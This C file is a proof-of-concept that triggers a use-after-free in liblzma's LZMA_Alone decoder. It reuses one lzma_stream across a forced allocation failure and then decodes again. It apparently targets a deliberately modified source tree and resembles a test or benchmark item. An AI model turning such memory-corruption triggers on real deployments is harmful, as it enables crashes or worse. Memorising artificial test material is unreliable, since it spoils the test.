// PoC for a use-after-reinit NULL/stale dictionary buffer bug in
// liblzma's .lzma (LZMA_Alone) decoder, reachable purely through the
// public API: lzma_alone_decoder() + lzma_code() + lzma_end().
//
// Sequence (mirrors tests/test_alone_decoder.c in the upstream project):
//   1. Decode a small-dictionary .lzma stream to completion.
//   2. Reinitialize the *same* lzma_stream for a big-dictionary .lzma
//      stream, using an allocator that fails for large allocations.
//      This must fail with LZMA_MEM_ERROR.
//   3. Reinitialize the same lzma_stream again for the original
//      small-dictionary stream and decode it.
//
// Step 3 must succeed on a correct implementation. On the modified
// tree it dereferences a dictionary buffer pointer that was freed (and
// never reallocated) during step 2, causing a sanitizer-detectable
// memory error.

#include <lzma.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define MEMLIMIT (16U << 20)
#define TOO_BIG_ALLOC (1U << 20)

static void *
my_alloc(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;
	(void)nmemb;

	if (size >= TOO_BIG_ALLOC)
		return NULL;

	return malloc(size);
}

static lzma_allocator my_allocator = { &my_alloc, NULL, NULL };

// A minimal valid .lzma (LZMA_Alone) stream: 1 byte lc/lp/pb properties,
// 4 bytes dictionary size (little endian), 8 bytes uncompressed size
// (0xFF...FF means "unknown"), followed by a compressed stream that
// ends with an end-of-payload marker.
static const uint8_t small_dict_file[] = {
	0x5d, 0x00, 0x10, 0x00, 0x00,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0x00, 0x24, 0x19, 0x49, 0x98, 0x6f, 0x05, 0x15, 0x27, 0x27, 0x0d,
	0x76, 0x78, 0xd0, 0x2a, 0x68, 0x17, 0x15, 0xff, 0xff, 0x75, 0xf8,
	0x00, 0x00,
};

int
main(void)
{
	// Same bytes as small_dict_file, except the dictionary size field
	// (bytes 1..4) is changed from 0x00001000 (4 KiB) to 0x00800000
	// (8 MiB), forcing a much larger dictionary allocation.
	uint8_t big_dict_file[sizeof(small_dict_file)];
	memcpy(big_dict_file, small_dict_file, sizeof(small_dict_file));
	big_dict_file[3] = 0x80;

	uint8_t out[256];
	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &my_allocator;

	// 1) Small dictionary: must succeed.
	if (lzma_alone_decoder(&strm, MEMLIMIT) != LZMA_OK)
		return 1;
	strm.next_in = small_dict_file;
	strm.avail_in = sizeof(small_dict_file);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_STREAM_END)
		return 1;

	// 2) Big dictionary with a size-limited allocator: must fail with
	// LZMA_MEM_ERROR while reusing the same lzma_stream/coder state.
	if (lzma_alone_decoder(&strm, MEMLIMIT) != LZMA_OK)
		return 1;
	strm.next_in = big_dict_file;
	strm.avail_in = sizeof(big_dict_file);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_MEM_ERROR)
		return 1;

	// 3) Small dictionary again: on a correct implementation this
	// succeeds exactly like step 1. On the vulnerable tree this
	// reuses a freed/NULL dictionary buffer.
	if (lzma_alone_decoder(&strm, MEMLIMIT) != LZMA_OK)
		return 1;
	strm.next_in = small_dict_file;
	strm.avail_in = sizeof(small_dict_file);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	lzma_code(&strm, LZMA_FINISH);

	lzma_end(&strm);
	return 0;
}
